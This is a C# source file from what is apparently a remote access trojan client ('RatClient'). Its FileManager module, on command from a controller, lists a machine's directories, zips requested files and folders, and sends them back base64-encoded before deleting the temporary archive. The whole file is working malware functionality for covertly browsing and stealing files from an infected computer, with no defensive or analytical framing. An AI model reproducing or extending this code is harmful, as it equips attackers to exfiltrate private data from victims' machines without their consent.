using System;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace RatClient.Features
{
    public class FileManager
    {
        #region Variables
        private Action<dynamic> SendJson;
        #endregion

        #region Constructor
        public FileManager(Action<dynamic> SendJson)
        {
            this.SendJson = SendJson;

            Program.MessageReceived += HandleMessage;
        }
        #endregion

        #region Methods
        private void HandleMessage(dynamic message)
        {
            try
            {
                if (message == null)
                {
                    Console.WriteLine("Error: Received null message");
                    return;
                }

                if (!(message is IDictionary<string, object> dict))
                {
                    Console.WriteLine($"Error: Invalid message format. Expected dictionary, got {message.GetType()}");
                    return;
                }

                if (!dict.ContainsKey("type"))
                {
                    Console.WriteLine("Error: Message is missing 'type' field");
                    return;
                }

                string type = dict["type"] as string;
                if (string.IsNullOrEmpty(type))
                {
                    Console.WriteLine("Error: 'type' field is null or empty");
                    return;
                }

                switch (type)
                {
                    case "fm_list":
                        if (!dict.ContainsKey("path"))
                        {
                            Console.WriteLine("Error: 'fm_list' message is missing 'path' field");
                            return;
                        }
                        string path = dict["path"] as string;
                        string filesAndFolders = GetFilesAndFolders(path);
                        if (!string.IsNullOrEmpty(filesAndFolders))
                        {
                            SendJson(new { type = "fm_list", filesAndFolders });
                        }
                        break;

                    case "fm_download":
                        if (!dict.ContainsKey("paths"))
                        {
                            Console.WriteLine("Error: 'fm_download' message is missing 'paths' field");
                            return;
                        }
                        if (!(dict["paths"] is IEnumerable<object> pathObjects))
                        {
                            Console.WriteLine("Error: 'paths' field is not an enumerable");
                            return;
                        }
                        List<string> paths = pathObjects.Select(p => p.ToString()).ToList();
                        DownloadFiles(paths);
                        break;
                }
            }
            catch (Microsoft.CSharp.RuntimeBinder.RuntimeBinderException ex)
            {
                Console.WriteLine($"Error accessing message fields: {ex.Message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Unexpected error processing message: {ex.Message}");
            }
        }

        private void DownloadFiles(List<string> paths)
        {
            string baseDir = Path.GetDirectoryName(paths[0]);
            string zipName = Path.GetFileName(baseDir) + ".zip";
            string zipPath = Path.Combine(Path.GetTempPath(), zipName);

            using (var zip = new ZipArchive(File.Create(zipPath), ZipArchiveMode.Create))
            {
                foreach (string path in paths)
                {
                    if (Directory.Exists(path))
                    {
                        ZipDirectory(path, zip, baseDir);
                    }
                    else if (File.Exists(path))
                    {
                        var entry = zip.CreateEntry(GetRelativePath(baseDir, path));
                        using (var entryStream = entry.Open())
                        using (var fileStream = File.OpenRead(path))
                        {
                            fileStream.CopyTo(entryStream);
                        }
                    }
                }
            }

            byte[] zipData = File.ReadAllBytes(zipPath);
            File.Delete(zipPath);

            string data = Convert.ToBase64String(zipData);
            SendJson(new { type = "fm_download", name = zipName, data });
        }

        private void ZipDirectory(string path, ZipArchive zip, string baseDir)
        {
            foreach (string file in Directory.GetFiles(path, "*", SearchOption.AllDirectories))
            {
                var entry = zip.CreateEntry(GetRelativePath(baseDir, file));
                using (var entryStream = entry.Open())
                using (var fileStream = File.OpenRead(file))
                {
                    fileStream.CopyTo(entryStream);
                }
            }
        }

        public string GetFilesAndFolders(string path)
        {
            Dictionary<string, object> items = new Dictionary<string, object>();
            if (!Directory.Exists(path))
            {
                return "";
            }

            foreach (var directory in Directory.GetDirectories(path, "*", SearchOption.TopDirectoryOnly))
            {
                DirectoryInfo dirInfo = new DirectoryInfo(directory);
                items[dirInfo.Name] = new { Type = "DIRECTORY", Size = "N/A" };
            }
            foreach (var file in Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly))
            {
                FileInfo fileInfo = new FileInfo(file);
                items[fileInfo.Name] = new { Type = "FILE", Size = fileInfo.Length.ToString() };
            }

            return new JavaScriptSerializer().Serialize(items);
        }

        private string GetRelativePath(string relativeTo, string path)
        {
            var relativeUri = new Uri(relativeTo).MakeRelativeUri(new Uri(path));
            return Uri.UnescapeDataString(relativeUri.ToString()).Replace(Path.AltDirectorySeparatorChar, Path.DirectorySeparatorChar);
        }
        #endregion
    }
}